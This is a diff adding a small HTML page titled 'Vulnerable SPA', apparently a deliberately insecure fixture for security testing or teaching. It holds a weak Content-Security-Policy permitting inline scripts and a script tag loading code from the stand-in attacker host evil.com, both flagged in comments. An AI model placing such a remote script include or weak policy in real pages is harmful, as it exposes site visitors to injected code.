@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Vulnerable SPA</title>
+    <!-- CSP misconfiguration -->
+    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline';">
+  </head>
+  <body>
+    <div id="root"></div>
+    <!-- Insecure external script -->
+    <script src="http://evil.com/malware.js"></script>
+  </body>
+</html>
